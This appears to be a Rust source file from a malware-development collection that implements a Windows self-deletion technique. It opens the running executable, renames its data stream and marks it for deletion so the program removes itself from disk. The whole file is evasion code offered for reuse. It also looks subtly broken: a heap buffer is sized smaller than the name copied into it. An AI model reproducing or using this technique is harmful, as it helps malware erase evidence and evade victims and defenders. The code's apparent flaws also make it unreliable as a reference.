/*
    Self Deletion Technique
    For More Codes: https://github.com/Whitecat18/Rust-for-Malware-Development.git
    Resources Used: 
        https://maxkersten.nl/binary-analysis-course/malware-snippets/self-deletion/
        https://github.com/joaoviictorti/RustRedOps/blob/main/Self_Deletion/src/main.rs
    @5mukx

*/

use std::env::current_exe;
use std::mem::{size_of, size_of_val};
use std::ptr::null_mut;
use winapi::ctypes::c_void;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileW, SetFileInformationByHandle, FILE_RENAME_INFO};
use winapi::um::handleapi::CloseHandle;
use winapi::um::heapapi::HeapFree;
use winapi::um::minwinbase::{FileDispositionInfo, FileRenameInfo};
use winapi::um::winnt::HEAP_ZERO_MEMORY;
use winapi::um::{fileapi::FILE_DISPOSITION_INFO, heapapi::{GetProcessHeap, HeapAlloc}};
use winapi::um::handleapi::INVALID_HANDLE_VALUE;

macro_rules! okey {
    ($msg:expr, $($arg:expr), *) => {
        println!("[+] {}",format!($msg, $($arg), *));
    }
}

macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("[!] {}",format!($msg, $($arg), *));
        println!("Exiting ...");
        std::process::exit(1);
    };
}

pub const NULL: *mut c_void = 0 as *mut c_void;

fn main(){
    let stream = "let del this nerdy !";
    let stream_wide: Vec<u16> = stream.encode_utf16().chain(std::iter::once(0)).collect();

    unsafe{
        let mut delete_file: FILE_DISPOSITION_INFO = std::mem::zeroed();
        delete_file.DeleteFile = true.into(); 

        let length = size_of::<FILE_RENAME_INFO>();

        let rename_info = HeapAlloc(
            GetProcessHeap(), 
            HEAP_ZERO_MEMORY,
            length as usize
        ) as *mut FILE_RENAME_INFO;

        (*rename_info).FileNameLength = (stream_wide.len() * size_of::<u16>()) as u32 - 2;

        std::ptr::copy_nonoverlapping(
            stream_wide.as_ptr(),
            (*rename_info).FileName.as_mut_ptr(), 
            stream_wide.len()
        );

        let path = current_exe().unwrap();
        let path_str = path.to_str().unwrap();
        
        let mut full_path: Vec<u16> = path_str.encode_utf16().collect();
        full_path.push(0);

        let h_file = CreateFileW(
            full_path.as_ptr(),
            0x00010000 | 0x00100000, 
            0x00000001,
            null_mut(),
            3 as u32,
            0,
            null_mut(),
        );

        if h_file == INVALID_HANDLE_VALUE {
            error!("CreateFileW Error: {:?}",GetLastError());
        }

        okey!("CreateFileW Adr: {:?}",h_file);

        SetFileInformationByHandle(
            h_file,
            FileRenameInfo,
            rename_info as *mut _,
            length as u32,
        );
        
        CloseHandle(h_file);

        let h_file = CreateFileW(
            full_path.as_ptr(),
            0x00010000 | 0x00100000, 
            0x00000001,
            null_mut(),
            3 as u32,
            0,
            null_mut(),
        );

        if h_file == INVALID_HANDLE_VALUE {
            error!("CreateFileW Error2: {}",GetLastError());
        }

        SetFileInformationByHandle(
            h_file,
            FileDispositionInfo,
            &delete_file as *const _ as *mut _,
            size_of_val(&delete_file) as u32,
        );

        CloseHandle(h_file);

        HeapFree(
            GetProcessHeap(),
            0,
            rename_info as *mut c_void,
        );
    }
}

